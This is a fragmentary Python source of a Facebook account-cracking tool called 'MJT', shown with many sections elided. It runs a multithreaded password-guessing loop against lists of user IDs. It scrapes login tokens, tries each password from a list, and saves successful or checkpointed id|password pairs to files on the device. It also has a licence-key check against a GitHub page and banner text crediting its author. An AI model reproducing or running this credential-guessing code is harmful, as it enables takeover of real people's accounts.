...
time.sleep(3)
os.system(f'xdg-open https://www.facebook.com/profile.php?id=100092524749210&mibextid=ZbWKwL ')
try:
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/manjtcrexx').text
		ua=open('.mix.txt','w')
...
def MJTALWAYSONFIRE():
  ...
  id = "᯾".join(uuid)
  server = requests.get(f'https://github.com/manjtcrexx').text
...
/* |_|  |_|\___/  |_|   
\033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
 Author    : MANNU X SARKAR
 Github    : @manjtcrexx
 Facebook  : MANJT CREXX
 Tool Name : MJT
...
\033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m""")           
  ...
  #print(f"Send Your Key Facebook")
  #os.system(f'xdg-open https://www.facebook.com/profile.php?id=100092524749210&mibextid=ZbWKwL')
  time.sleep(1)
  print(f"\033[1;37mChecking Your Key")
  try:
    httpCaht = requests.get(f"https://github.com/manjtcrexx").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/+977 ?text='+id)
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
\033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
 ...
 Github    : @manjtcrexx 
 Facebook  : MANJT CREXX
 Tool Name : \033[1;36mM J T\033[1;37m
 Tool Type : \033[1;31mTRIAL\033[1;37m
...
def Mjt():
	...
	if me in ["1", "01","11","A","a"]:
		...
		with tred(max_workers=30) as crack_submit:
			...
			print(f"\033[1;36m Use Flight Mode For Speed Up And Ok ids\033[1;37m")
			linex()
			for user in fo:
...
# Ensure ugen, oks, cps, loop are defined somewhere in your global scope

def m1(ids, names, passlist):
    global loop, oks, cps
    sys.stdout.write(f'\r\r\033[1;37m [MJT] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]' % (loop, len(oks)))
    sys.stdout.flush()
    ...
    try:
        ...
        for fikr in passlist:
            ...
            idpass = {
                "lsd": re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),
                "jazoest": re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),
                "uid": ids,
            ...
            MJT = session.cookies.get_dict().keys()
            
            if "c_user" in MJT:
                coki = session.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                print(f'\r\r\033[1;32m [MJT\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s' % (ids, pas))
                open(f'/sdcard/MJT•OK•M1.txt', 'a').write(ids + '|' + pas + '\n')
                oks.append(ids)
                break
            elif 'checkpoint' in MJT:
                # Make sure the variable 'pcp' is defined earlier or remove the condition below
                if 'y' in pcp:
                    print(f'\r\r\x1b[38;5;208m [MJT•CP] ' + ids + ' • ' + pas + '\033[1;97m')
                    open(f'/sdcard/MJT•CP.txt', 'a').write(ids + '|' + pas + '\n')
                    cps.append(ids)
                    break
                else:
                    break
...
def m3(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [MJT] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Mjt:
                                ...
                                open(f'/sdcard/MJT•OK•M3.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Mjt:
                                if 'y' in pcp:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Mjt:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/MJT•OK•M2.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Mjt:
                                if 'y' in pcp:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Mjt:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/MJT•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Mjt:
                                if 'y' in pcp:
